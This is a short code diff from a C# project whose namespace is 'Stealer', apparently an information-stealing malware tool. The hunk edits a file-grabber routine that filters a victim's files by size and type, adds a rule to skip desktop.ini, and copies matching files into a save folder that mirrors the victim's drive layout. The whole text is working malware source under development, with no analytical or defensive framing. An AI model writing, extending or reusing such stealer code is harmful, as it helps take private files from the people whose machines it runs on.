@@ -71,13 +71,15 @@ namespace Stealer
             // Check file size
             FileInfo file = new FileInfo(path);
             if (file.Length > Config.GrabberSizeLimit) return;
+            // Check file name
+            if (file.Name == "desktop.ini") return;
             // Check file type
             string type = DetectFileType(file.Extension);
             if (type == null) return;
             // Get directory and file paths to copy
-            string CopyDirectoryName = Path.Combine(SavePath, Path.GetDirectoryName(path)
-                .Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", "")));
-            string CopyFileName = Path.Combine(CopyDirectoryName, file.Name);
+            string CopyDirectoryName = (Path.Combine(SavePath, Path.GetDirectoryName(path)
+                .Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", ""))));
+            string CopyFileName = (Path.Combine(CopyDirectoryName, file.Name));
             // Create directory to copy. If not exists
             if (!Directory.Exists(CopyDirectoryName))
                 Directory.CreateDirectory(CopyDirectoryName);
